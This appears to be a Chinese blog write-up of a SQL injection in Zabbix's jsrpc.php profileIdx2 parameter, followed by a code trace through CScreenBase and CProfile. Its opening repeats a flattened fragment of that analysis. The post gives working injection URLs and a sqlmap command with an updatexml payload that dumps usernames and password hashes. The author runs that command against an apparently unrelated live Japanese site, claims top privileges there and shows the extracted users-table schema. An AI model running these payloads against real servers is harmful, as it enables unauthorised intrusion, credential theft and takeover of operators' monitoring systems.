!empty($data[&#x27;period&#x27;]) ? $data[&#x27;period&#x27;] : null,            &#x27;stime&#x27; =&gt; !empty($data[&#x27;stime&#x27;]) ? $data[&#x27;stime&#x27;] : null,            &#x27;profileIdx&#x27; =&gt; !empty($data[&#x27;profileIdx&#x27;]) ? $data[&#x27;profileIdx&#x27;] : null,            &#x27;profileIdx2&#x27; =&gt; !empty($data[&#x27;profileIdx2&#x27;]) ? $data[&#x27;profileIdx2&#x27;] : null,            &#x27;updateProfile&#x27; =&gt; isset($data[&#x27;updateProfile&#x27;]) ? $data[&#x27;updateProfile&#x27;] : null        );        if ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_HISTORY) &#123;            $options[&#x27;itemids&#x27;] = !empty($data[&#x27;itemids&#x27;]) ? $data[&#x27;itemids&#x27;] : null;            $options[&#x27;action&#x27;] = !empty($data[&#x27;action&#x27;]) ? $data[&#x27;action&#x27;] : null;            $options[&#x27;filter&#x27;] = !empty($data[&#x27;filter&#x27;]) ? $data[&#x27;filter&#x27;] : null;            $options[&#x27;filter_task&#x27;] = !empty($data[&#x27;filter_task&#x27;]) ? $data[&#x27;filter_task&#x27;] : null;            $options[&#x27;mark_color&#x27;] = !empty($data[&#x27;mark_color&#x27;]) ? $data[&#x27;mark_color&#x27;] : null;        &#125;        elseif ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_CHART) &#123;            $options[&#x27;graphid&#x27;] = !empty($data[&#x27;graphid&#x27;]) ? $data[&#x27;graphid&#x27;] : null;            $options[&#x27;profileIdx2&#x27;] = $options[&#x27;graphid&#x27;];        &#125;        $screenBase = CScreenBuilder::getScreen($options);        if (!empty($screenBase)) &#123;            $screen = $screenBase-&gt;get();        &#125;        if (!empty($screen)) &#123;            if ($options[&#x27;mode&#x27;] == SCREEN_MODE_JS) &#123;                $result = $screen;            &#125;            else &#123;                if (is_object($screen)) &#123;                    $result = $screen-&gt;toString();                &#125;            &#125;        &#125;        else &#123;            $result = &#x27;&#x27;;        &#125;        break;省略部分代码require_once dirname(__FILE__).&#x27;/include/page_footer.php&#x27;;

其中$options[profileIdx2]赋值了$data[profileIdx2]，之后调用这几句代码
1234$screenBase = CScreenBuilder::getScreen($options);if (!empty($screenBase)) &#123;    $screen = $screenBase-&gt;get();&#125;

一时没了思路，跟几句代码死磕，找到zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBuilder.php，在public static function getScreen(array $options = array())函数中没有找到可以造成漏洞的交互点，太菜了！！！ ,可以看到profileIdx2已经到达了下面代码中了
1234// calculate time        $this-&gt;profileIdx = !empty($options[&#x27;profileIdx&#x27;]) ? $options[&#x27;profileIdx&#x27;] : &#x27;&#x27;;        $this-&gt;profileIdx2 = !empty($options[&#x27;profileIdx2&#x27;]) ? $options[&#x27;profileIdx2&#x27;] : null;        $this-&gt;updateProfile = isset($options[&#x27;updateProfile&#x27;]) ? $options[&#x27;updateProfile&#x27;] : true;

一路上没有经过任何过滤，然后接着往下看可以看到
1234567$this-&gt;timeline = CScreenBase::calculateTime(array(            &#x27;profileIdx&#x27; =&gt; $this-&gt;profileIdx,            &#x27;profileIdx2&#x27; =&gt; $this-&gt;profileIdx2,            &#x27;updateProfile&#x27; =&gt; $this-&gt;updateProfile,            &#x27;period&#x27; =&gt; !empty($options[&#x27;period&#x27;]) ? $options[&#x27;period&#x27;] : null,            &#x27;stime&#x27; =&gt; !empty($options[&#x27;stime&#x27;]) ? $options[&#x27;stime&#x27;] : null        ));

profileIdx2成为了calculateTime的参数，这时我们追踪一下calculateTime函数，在zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBase.php中，代码如下
1234567891011121314151617181920212223242526272829303132333435public static function calculateTime(array $options = array()) &#123;    if (!array_key_exists(&#x27;updateProfile&#x27;, $options)) &#123;        $options[&#x27;updateProfile&#x27;] = true;    &#125;    if (empty($options[&#x27;profileIdx2&#x27;])) &#123;        $options[&#x27;profileIdx2&#x27;] = 0;    &#125;    // show only latest data without update is set only period    if (!empty($options[&#x27;period&#x27;]) &amp;&amp; empty($options[&#x27;stime&#x27;])) &#123;        $options[&#x27;updateProfile&#x27;] = false;        $options[&#x27;profileIdx&#x27;] = &#x27;&#x27;;    &#125;    // period    if (empty($options[&#x27;period&#x27;])) &#123;  ...
                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>zabbix是一个开源的企业级性能监控解决方案。近日，zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。</p>
<h2 id="0x02-影响程度"><a href="#0x02-影响程度" class="headerlink" title="0x02 影响程度"></a>0x02 影响程度</h2><ul>
<li>攻击成本：低</li>
<li>危害程度：高</li>
<li>是否登陆：不需要</li>
<li>影响版本：2.2.x，3.0.0-3.0.3</li>
</ul>
<h2 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h2><p>在zabbix的地址后面添加：</p>
<ul>
<li>利用方式一</li>
</ul>
<p><code>/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim estamp=1471054088083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2’3297&amp;updateProfil e=true&amp;screenitemid=&amp;period=3600&amp;stime=20170813040734&amp;resourcetype= 17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp; mark_color=1</code></p>
<p>如果出现下列代码则证明漏洞存在</p>
<p><code>&lt;div class=&quot;flickerfreescreen&quot; data-timestamp=&quot;1471054088083&quot; id=&quot;flickerfreescreen_1&quot;&gt;&lt;table class=&quot;list-table&quot; id=&quot;t57ae81946b8cb&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;cell- width&quot;&gt;Timestamp&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr class=&quot;nothing-to-show&quot;&gt;&lt;td colspan=&quot;2&quot;&gt;No data found.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class=&quot;msg-bad&quot;&gt;&lt;div class=&quot;msg-details&quot;&gt;&lt;ul&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (39, 1, &#39;web.item.graph.period&#39;, &#39;3600&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_str, type, idx2) VALUES (40, 1, &#39;web.item.graph.stime&#39;, &#39;20160813041028&#39;, 3, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (41, 1, &#39;web.item.graph.isnow&#39;, &#39;1&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;span class=&quot;overlay-close-btn&quot; onclick=&quot;javascript: $(this).closest(&#39;.msg-bad&#39;).remove();&quot; title=&quot;Close&quot;&gt;&lt;/span&gt;&lt;/div&gt;</code></p>
<ul>
<li>利用方式二</li>
</ul>
<p><code>latest.php?output=ajax&amp;sid=&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=15385);select * from users where (1=1</code></p>
<p>如果出现下列代码则证明漏洞存在</p>
<p><code>SQL (0.000361):INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES(88, 1, &#39;web.latest.toggle&#39;, &#39;1&#39;, 2, 15385); select * from users where (1=1) latest.php:746 →require_once() → CProfile::flush() → CProfile::insertDB() → DBexecute() in/home/sasha/zabbix-svn/branches/2.2/frontends/php/include/profiles.inc.php:185</code></p>
<h2 id="0x04-实战测试"><a href="#0x04-实战测试" class="headerlink" title="0x04 实战测试"></a>0x04 实战测试</h2><p>测试的一个Japan站</p>
<p><code>sqlmap -u &quot;http://157.×××.×××.98/jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1(select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&quot; --level=3 --risk=2 --columns -T &quot;users&quot; -D &quot;public&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Database: public</span><br><span class="line">Table: users</span><br><span class="line">[16 columns]</span><br><span class="line">+----------------+---------+</span><br><span class="line">| Column         | Type    |</span><br><span class="line">+----------------+---------+</span><br><span class="line">| alias          | varchar |</span><br><span class="line">| attempt_clock  | int4    |</span><br><span class="line">| attempt_failed | int4    |</span><br><span class="line">| attempt_ip     | varchar |</span><br><span class="line">| autologin      | int4    |</span><br><span class="line">| autologout     | int4    |</span><br><span class="line">| lang           | varchar |</span><br><span class="line">| name           | varchar |</span><br><span class="line">| passwd         | bpchar  |</span><br><span class="line">| refresh        | int4    |</span><br><span class="line">| rows_per_page  | int4    |</span><br><span class="line">| surname        | varchar |</span><br><span class="line">| theme          | varchar |</span><br><span class="line">| type           | int4    |</span><br><span class="line">| url            | varchar |</span><br><span class="line">| userid         | int8    |</span><br><span class="line">+----------------+---------+</span><br></pre></td></tr></table></figure>

<p>可获得最高权限</p>
<h2 id="0x05-代码分析"><a href="#0x05-代码分析" class="headerlink" title="0x05 代码分析"></a>0x05 代码分析</h2><p>zabbix 2.2.14</p>
<ul>
<li>首先从poc中的<code>jsrpc.php</code>文件入手，</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">require_once dirname(__FILE__).&#x27;/include/config.inc.php&#x27;;</span><br><span class="line"></span><br><span class="line">$requestType = get_request(&#x27;type&#x27;, PAGE_TYPE_JSON);</span><br><span class="line">if ($requestType == PAGE_TYPE_JSON) &#123;</span><br><span class="line">    $http_request = new CHTTP_request();</span><br><span class="line">    $json = new CJSON();</span><br><span class="line">    $data = $json-&gt;decode($http_request-&gt;body(), true);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    $data = $_REQUEST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这里看到data是由REQUEST赋值的，接受 GET/POST/COOKIE任意一种输入，所以payload可以用get方式传输，在payload中由<code>method=screen.get</code>这一部分，在源码中可以看到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;screen.get&#x27;:</span><br><span class="line">        $options = array(</span><br><span class="line">            &#x27;pageFile&#x27; =&gt; !empty($data[&#x27;pageFile&#x27;]) ? $data[&#x27;pageFile&#x27;] : null,</span><br><span class="line">            &#x27;mode&#x27; =&gt; !empty($data[&#x27;mode&#x27;]) ? $data[&#x27;mode&#x27;] : null,</span><br><span class="line">            &#x27;timestamp&#x27; =&gt; !empty($data[&#x27;timestamp&#x27;]) ? $data[&#x27;timestamp&#x27;] : time(),</span><br><span class="line">            &#x27;resourcetype&#x27; =&gt; !empty($data[&#x27;resourcetype&#x27;]) ? $data[&#x27;resourcetype&#x27;] : null,</span><br><span class="line">            &#x27;screenitemid&#x27; =&gt; !empty($data[&#x27;screenitemid&#x27;]) ? $data[&#x27;screenitemid&#x27;] : null,</span><br><span class="line">            &#x27;groupid&#x27; =&gt; !empty($data[&#x27;groupid&#x27;]) ? $data[&#x27;groupid&#x27;] : null,</span><br><span class="line">            &#x27;hostid&#x27; =&gt; !empty($data[&#x27;hostid&#x27;]) ? $data[&#x27;hostid&#x27;] : null,</span><br><span class="line">            &#x27;period&#x27; =&gt; !empty($data[&#x27;period&#x27;]) ? $data[&#x27;period&#x27;] : null,</span><br><span class="line">            &#x27;stime&#x27; =&gt; !empty($data[&#x27;stime&#x27;]) ? $data[&#x27;stime&#x27;] : null,</span><br><span class="line">            &#x27;profileIdx&#x27; =&gt; !empty($data[&#x27;profileIdx&#x27;]) ? $data[&#x27;profileIdx&#x27;] : null,</span><br><span class="line">            &#x27;profileIdx2&#x27; =&gt; !empty($data[&#x27;profileIdx2&#x27;]) ? $data[&#x27;profileIdx2&#x27;] : null,</span><br><span class="line">            &#x27;updateProfile&#x27; =&gt; isset($data[&#x27;updateProfile&#x27;]) ? $data[&#x27;updateProfile&#x27;] : null</span><br><span class="line">        );</span><br><span class="line">        if ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_HISTORY) &#123;</span><br><span class="line">            $options[&#x27;itemids&#x27;] = !empty($data[&#x27;itemids&#x27;]) ? $data[&#x27;itemids&#x27;] : null;</span><br><span class="line">            $options[&#x27;action&#x27;] = !empty($data[&#x27;action&#x27;]) ? $data[&#x27;action&#x27;] : null;</span><br><span class="line">            $options[&#x27;filter&#x27;] = !empty($data[&#x27;filter&#x27;]) ? $data[&#x27;filter&#x27;] : null;</span><br><span class="line">            $options[&#x27;filter_task&#x27;] = !empty($data[&#x27;filter_task&#x27;]) ? $data[&#x27;filter_task&#x27;] : null;</span><br><span class="line">            $options[&#x27;mark_color&#x27;] = !empty($data[&#x27;mark_color&#x27;]) ? $data[&#x27;mark_color&#x27;] : null;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_CHART) &#123;</span><br><span class="line">            $options[&#x27;graphid&#x27;] = !empty($data[&#x27;graphid&#x27;]) ? $data[&#x27;graphid&#x27;] : null;</span><br><span class="line">            $options[&#x27;profileIdx2&#x27;] = $options[&#x27;graphid&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $screenBase = CScreenBuilder::getScreen($options);</span><br><span class="line">        if (!empty($screenBase)) &#123;</span><br><span class="line">            $screen = $screenBase-&gt;get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!empty($screen)) &#123;</span><br><span class="line">            if ($options[&#x27;mode&#x27;] == SCREEN_MODE_JS) &#123;</span><br><span class="line">                $result = $screen;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                if (is_object($screen)) &#123;</span><br><span class="line">                    $result = $screen-&gt;toString();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $result = &#x27;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">省略部分代码</span><br><span class="line"></span><br><span class="line">require_once dirname(__FILE__).&#x27;/include/page_footer.php&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中$options[profileIdx2]赋值了$data[profileIdx2]，<br>之后调用这几句代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$screenBase = CScreenBuilder::getScreen($options);</span><br><span class="line">if (!empty($screenBase)) &#123;</span><br><span class="line">    $screen = $screenBase-&gt;get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一时没了思路，跟几句代码死磕，找到<code>zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBuilder.php</code>，<del>在<code>public static function getScreen(array $options = array())</code>函数中没有找到可以造成漏洞的交互点，太菜了！！！</del> ,可以看到<code>profileIdx2</code>已经到达了下面代码中了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// calculate time</span><br><span class="line">        $this-&gt;profileIdx = !empty($options[&#x27;profileIdx&#x27;]) ? $options[&#x27;profileIdx&#x27;] : &#x27;&#x27;;</span><br><span class="line">        $this-&gt;profileIdx2 = !empty($options[&#x27;profileIdx2&#x27;]) ? $options[&#x27;profileIdx2&#x27;] : null;</span><br><span class="line">        $this-&gt;updateProfile = isset($options[&#x27;updateProfile&#x27;]) ? $options[&#x27;updateProfile&#x27;] : true;</span><br></pre></td></tr></table></figure>

<p>一路上没有经过任何过滤，然后接着往下看可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;timeline = CScreenBase::calculateTime(array(</span><br><span class="line">            &#x27;profileIdx&#x27; =&gt; $this-&gt;profileIdx,</span><br><span class="line">            &#x27;profileIdx2&#x27; =&gt; $this-&gt;profileIdx2,</span><br><span class="line">            &#x27;updateProfile&#x27; =&gt; $this-&gt;updateProfile,</span><br><span class="line">            &#x27;period&#x27; =&gt; !empty($options[&#x27;period&#x27;]) ? $options[&#x27;period&#x27;] : null,</span><br><span class="line">            &#x27;stime&#x27; =&gt; !empty($options[&#x27;stime&#x27;]) ? $options[&#x27;stime&#x27;] : null</span><br><span class="line">        ));</span><br></pre></td></tr></table></figure>

<p><code>profileIdx2</code>成为了<code>calculateTime</code>的参数，这时我们追踪一下<code>calculateTime</code>函数，在<code>zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBase.php</code>中，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public static function calculateTime(array $options = array()) &#123;</span><br><span class="line">    if (!array_key_exists(&#x27;updateProfile&#x27;, $options)) &#123;</span><br><span class="line">        $options[&#x27;updateProfile&#x27;] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (empty($options[&#x27;profileIdx2&#x27;])) &#123;</span><br><span class="line">        $options[&#x27;profileIdx2&#x27;] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // show only latest data without update is set only period</span><br><span class="line">    if (!empty($options[&#x27;period&#x27;]) &amp;&amp; empty($options[&#x27;stime&#x27;])) &#123;</span><br><span class="line">        $options[&#x27;updateProfile&#x27;] = false;</span><br><span class="line">        $options[&#x27;profileIdx&#x27;] = &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // period</span><br><span class="line">    if (empty($options[&#x27;period&#x27;])) &#123;</span><br><span class="line">        $options[&#x27;period&#x27;] = !empty($options[&#x27;profileIdx&#x27;])</span><br><span class="line">            ? CProfile::get($options[&#x27;profileIdx&#x27;].&#x27;.period&#x27;, ZBX_PERIOD_DEFAULT, $options[&#x27;profileIdx2&#x27;])</span><br><span class="line">            : ZBX_PERIOD_DEFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        if ($options[&#x27;period&#x27;] &lt; ZBX_MIN_PERIOD) &#123;</span><br><span class="line">            show_message(_n(&#x27;Minimum time period to display is %1$s hour.&#x27;,</span><br><span class="line">                    &#x27;Minimum time period to display is %1$s hours.&#x27;, (int) ZBX_MIN_PERIOD / SEC_PER_HOUR));</span><br><span class="line">            $options[&#x27;period&#x27;] = ZBX_MIN_PERIOD;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif ($options[&#x27;period&#x27;] &gt; ZBX_MAX_PERIOD) &#123;</span><br><span class="line">            show_message(_n(&#x27;Maximum time period to display is %1$s day.&#x27;,</span><br><span class="line">                    &#x27;Maximum time period to display is %1$s days.&#x27;, (int) ZBX_MAX_PERIOD / SEC_PER_DAY));</span><br><span class="line">            $options[&#x27;period&#x27;] = ZBX_MAX_PERIOD;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($options[&#x27;updateProfile&#x27;] &amp;&amp; !empty($options[&#x27;profileIdx&#x27;])) &#123;</span><br><span class="line">        CProfile::update($options[&#x27;profileIdx&#x27;].&#x27;.period&#x27;, $options[&#x27;period&#x27;], PROFILE_TYPE_INT, $options[&#x27;profileIdx2&#x27;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点来了，可以看到<code>CProfile::update($options[&#39;profileIdx&#39;].&#39;.period&#39;, $options[&#39;period&#39;], PROFILE_TYPE_INT, $options[&#39;profileIdx2&#39;]);</code>这句，这时接着追踪CProfile来到<code>page_footer.php</code>中找到<code>profiles.inc.php</code>，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static function update($idx, $value, $type, $idx2 = 0) &#123;</span><br><span class="line">        if (is_null(self::$profiles)) &#123;</span><br><span class="line">            self::init();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!self::checkValueType($value, $type)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $profile = array(</span><br><span class="line">            &#x27;idx&#x27; =&gt; $idx,</span><br><span class="line">            &#x27;value&#x27; =&gt; $value,</span><br><span class="line">            &#x27;type&#x27; =&gt; $type,</span><br><span class="line">            &#x27;idx2&#x27; =&gt; $idx2</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $current = CProfile::get($idx, null, $idx2);</span><br><span class="line">        if (is_null($current)) &#123;</span><br><span class="line">            if (!isset(self::$insert[$idx])) &#123;</span><br><span class="line">                self::$insert[$idx] = array();</span><br><span class="line">            &#125;</span><br><span class="line">            self::$insert[$idx][$idx2] = $profile;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>self::$insert[$idx][$idx2] = $profile;</code>，参数已经到了<code>insert</code>中，</p>
<p><del>然后去请教表哥，表哥提示问题出现在<code>flush</code>中<br>根据表哥的提示，</del><br>在<code>page_footer.php</code>中发现CProfile类的flush方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// last page</span><br><span class="line">if (!defined(&#x27;ZBX_PAGE_NO_MENU&#x27;) &amp;&amp; $page[&#x27;file&#x27;] != &#x27;profile.php&#x27;) &#123;</span><br><span class="line">    CProfile::update(&#x27;web.paging.lastpage&#x27;, $page[&#x27;file&#x27;], PROFILE_TYPE_STR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CProfile::flush();</span><br><span class="line"></span><br><span class="line">// end transactions if they have not been closed already</span><br><span class="line">if (isset($DB) &amp;&amp; isset($DB[&#x27;TRANSACTIONS&#x27;]) &amp;&amp; $DB[&#x27;TRANSACTIONS&#x27;] != 0) &#123;</span><br><span class="line">    error(_(&#x27;Transaction has not been closed. Aborting...&#x27;));</span><br><span class="line">    DBend(false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>profiles.inc.php</code>中找到了flush函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public static function flush() &#123;</span><br><span class="line">        // if not initialised, no changes were made</span><br><span class="line">        if (is_null(self::$profiles)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (self::$userDetails[&#x27;userid&#x27;] &lt;= 0) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!empty(self::$insert) || !empty(self::$update)) &#123;</span><br><span class="line">            DBstart();</span><br><span class="line">            foreach (self::$insert as $idx =&gt; $profile) &#123;</span><br><span class="line">                foreach ($profile as $idx2 =&gt; $data) &#123;</span><br><span class="line">                    self::insertDB($idx, $data[&#x27;value&#x27;], $data[&#x27;type&#x27;], $idx2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ksort(self::$update);</span><br><span class="line">            foreach (self::$update as $idx =&gt; $profile) &#123;</span><br><span class="line">                ksort($profile);</span><br><span class="line">                foreach ($profile as $idx2 =&gt; $data) &#123;</span><br><span class="line">                    self::updateDB($idx, $data[&#x27;value&#x27;], $data[&#x27;type&#x27;], $idx2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            DBend();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>参数传入下面的<code>insertDB</code>函数</p>
